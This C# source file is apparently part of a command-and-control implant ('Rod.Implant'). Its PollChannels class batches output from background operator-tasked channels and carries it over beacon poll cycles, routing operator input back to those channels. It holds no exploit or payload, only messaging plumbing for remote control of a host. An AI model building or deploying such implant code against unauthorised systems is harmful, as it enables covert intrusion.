using System.Collections.Concurrent;
using Rod.V1;

namespace Rod.Implant.Internal;

// The poll cycle's cross-cycle channel carriage (architecture.md Sec
// 10.3): the store-and-forward discipline every poll-mode client runs,
// whatever its wire -- the envelope POST cycle, the gRPC drain cycles, the
// QUIC session cycles. Channels never bind to a connection: the handler
// runs in the background for the run's life, its output batching into the
// upstream this class owns (those frames ride whatever cycle comes next),
// its input arriving as ChannelInput frames on later cycles, and its final
// TaskResult riding whatever cycle carries the batch. Extracted from the
// envelope beacon so every poll shape shares one implementation instead of
// each transport growing its own.

/// <summary>
/// The upstream batch and live-channel set one poll-mode run holds. The
/// owning client flushes the batch at each cycle's start
/// (<see cref="SnapshotPending"/>, then <see cref="MarkDelivered"/> once the
/// writes crossed), routes downstream ChannelInput frames into the live
/// channels (<see cref="RouteInput"/>), and starts dispatched channel tasks
/// against the batch (<see cref="StartChannel"/>). Disposal ends every
/// channel with the run.
/// </summary>
internal sealed class PollChannels : IAsyncDisposable
{
    /// <summary>
    /// The handshake capability a poll-mode run advertises: "this artifact
    /// accepts channel traffic over its contact cycles" -- the server's
    /// parking hub reads it off the session and parks operator input for the
    /// next cycle to carry.
    /// </summary>
    public const string Capability = "channels.poll";

    private readonly HeldTaskLedger _held;
    private readonly TextWriter _log;
    private readonly object _gate = new();
    private readonly List<Frame> _upstream = new();
    private readonly ConcurrentDictionary<string, BeaconLiveChannel> _liveChannels = new();
    private readonly CancellationTokenSource _channelsGone = new();

    public PollChannels(HeldTaskLedger held, TextWriter log)
    {
        _held = held;
        _log = log;
    }

    /// <summary>
    /// Opens one channel for a dispatched streaming task and starts its
    /// handler in the background: the caller returns to its cadence
    /// immediately, the channel's output batches into the upstream through
    /// the live-channel write binding, and the delivery task reports the
    /// handler's outcome as the task's final TaskResult on whatever cycle
    /// carries it.
    /// </summary>
    public void StartChannel(TaskRequest task, CapabilityChannelHandler handler)
    {
        var channel = new BeaconLiveChannel(
            task.TaskId,
            (frame, ct) =>
            {
                AddUpstream(frame);
                return ValueTask.CompletedTask;
            });
        _liveChannels[task.TaskId] = channel;
        _log.WriteLine($"channel opened: task {task.TaskId} verb {task.Verb} (store-and-forward, poll cadence)");
        channel.Delivery = DeliverAsync(channel, task, handler);
    }

    /// <summary>Routes one downstream ChannelInput frame to the live channel it names.</summary>
    public void RouteInput(Frame frame)
    {
        var input = ChannelInput.Parser.ParseFrom(frame.Payload);
        _log.WriteLine(
            $"channel input: task {input.TaskId} {input.Data.Length}B eof={input.Eof}");
        BeaconFrames.RouteChannelInput(frame, _liveChannels, _log);
    }

    // The channel's delivery: run the handler to its end, then queue its
    // outcome. A channel whose run ends under it reports nothing further --
    // the server-side timeout is the documented close for a channel the
    // cycles stopped carrying.
    private async Task DeliverAsync(
        BeaconLiveChannel channel,
        TaskRequest task,
        CapabilityChannelHandler handler)
    {
        try
        {
            var (outcome, output) = await handler.Handle(task.Arguments, channel, _channelsGone.Token);
            QueueResult(task.TaskId, outcome, output);
            _log.WriteLine($"channel closed: task {task.TaskId} outcome {outcome}");
        }
        catch (OperationCanceledException)
        {
            // The run ended: the channel dies with it, documented.
        }
        catch (Exception ex)
        {
            _log.WriteLine($"channel ended without delivery: task {task.TaskId}: {ex.Message}");
        }
        finally
        {
            _liveChannels.TryRemove(task.TaskId, out _);
            channel.CompleteInput();
        }
    }

    /// <summary>
    /// One frame into the upstream batch, under the gate the background
    /// channels' output writes share with the owning cycle's snapshot.
    /// </summary>
    public void AddUpstream(Frame frame)
    {
        lock (_gate)
        {
            _upstream.Add(frame);
        }
    }

    /// <summary>
    /// Queues one task result and caches it in the held-task ledger: the
    /// delivery mark lands only when the cycle carrying the batch completed,
    /// so a dropped cycle re-sends through the batch the ledger's re-send
    /// would have covered anyway.
    /// </summary>
    public void QueueResult(string taskId, TaskOutcome outcome, string output)
    {
        AddUpstream(BeaconFrames.ResultFrame(taskId, outcome, output));
        _held.Remember(taskId, outcome, output);
    }

    /// <summary>
    /// The batch snapshot a cycle flushes at its start: everything
    /// accumulated, in order. The delivered frames clear only after the
    /// response crossed -- and only the delivered ones, so a background
    /// channel's output added mid-cycle is not lost.
    /// </summary>
    public List<Frame> SnapshotPending()
    {
        lock (_gate)
        {
            return new List<Frame>(_upstream);
        }
    }

    /// <summary>Clears exactly the frames a cycle delivered, after the cycle crossed.</summary>
    public void MarkDelivered(List<Frame> pending)
    {
        lock (_gate)
        {
            foreach (var delivered in pending)
                _upstream.Remove(delivered);
        }
    }

    /// <summary>
    /// Ends every live channel with the run: the token releases the handlers
    /// (their processes are killed and their pumps unwind), and the delivery
    /// waits keep the last upstream writes accounted.
    /// </summary>
    public async ValueTask DisposeAsync()
    {
        _channelsGone.Cancel();
        foreach (var live in _liveChannels.Values)
            live.CompleteInput();
        await Task.WhenAll(_liveChannels.Values.Select(c => c.Delivery));
        _channelsGone.Dispose();
    }
}
